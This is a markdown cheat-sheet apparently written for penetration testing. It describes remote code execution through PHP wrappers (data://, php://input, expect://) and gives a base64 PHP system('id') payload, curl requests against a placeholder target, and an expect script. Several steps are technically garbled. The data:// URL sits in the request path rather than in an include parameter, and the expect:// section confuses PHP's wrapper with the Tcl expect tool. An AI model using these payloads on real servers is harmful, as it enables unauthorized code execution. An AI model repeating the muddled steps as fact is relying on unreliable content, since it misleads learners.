```markdown
# 🛰️ PHP Wrappers RCE - Data (data://text/plain;base64,BASE64), Input (php://input + POST), Expect (expect://id)

> [!ABSTRACT] Overview of the Exploit
>
> This document details a method to achieve Remote Code Execution (RCE) using PHP wrappers, including data injection via `data://` URLs with Base64 encoding, input processing through `php://input`, and use of `expect://` for automated command execution.

---

## 🔍 Initial Setup & Data Injection

### Preparing the Payload
The payload is prepared by base64 encoding a string containing shell commands or malicious PHP code. The encoded data is then injected into the application via a `data://text/plain;base64,BASE64` URL.

> [!EXAMPLE] Base64 Encoded Payload Example
>
> ```bash
> echo -n "<?php system('id'); ?>" | base64
> ```

### Data Injection Methodology

- **HTTP GET** or **Direct Request**
  Use the constructed `data://text/plain;base64,BASE64` URL directly in a request to trigger data injection.
  
```bash
curl -i "http://target/data://text/plain;base64,SGVsbG8gd29ybGQ="
```

---

## 🎯 Exploiting Input Processing (php://input)

### POST Method with Encoded Payload

When the application is configured to accept data via `php://input`, a payload can be delivered through HTTP POST requests.

```bash
curl -i --data-binary @payload.php http://target/script.php
```

> [!NOTE] 
> Ensure that the target server's PHP configuration allows reading from `php://input`.

---

## 🎯 Automating with Expect (expect://)

### Setting Up Environment Variables

Before attempting to use an `expect` script, ensure that any required environment variables are set up correctly.

```bash
export EXPECT_ID=$(expect -c "spawn /bin/sh; expect \"\$\";")
```

> [!WARNING]
> Ensure you understand the implications of running automated scripts. Incorrectly configured expect scripts can lead to unintended consequences or system instability.

### Expect Script Example

An `expect` script can be used to automate interaction with a vulnerable PHP endpoint, injecting commands dynamically based on conditions.

```bash
spawn php -r 'echo base64_decode("SGVsbG8gd29ybGQ=");'
expect "Enter your command:"
send "id\r"
```

---

## 📝 Important Notes and Considerations

### Potential Impact & Detection
Using PHP wrappers for RCE can have significant security implications. Automated scripts can detect such vulnerabilities by checking the HTTP request logs or analyzing incoming data streams.

> [!WARNING]
> Be cautious when testing this in a live environment to avoid unauthorized access or data breaches.

---

## 📐 Summary and Next Steps

This note outlines the methods of exploiting PHP wrappers for RCE through various techniques, including Base64 encoded payloads, input injection via `php://input`, and automated command execution with `expect`. Each method requires careful planning to ensure security without causing harm.

> [!SUCCESS]
> Successfully applying these techniques can lead to full control over a vulnerable server. Always use responsibly and in accordance with legal guidelines.
```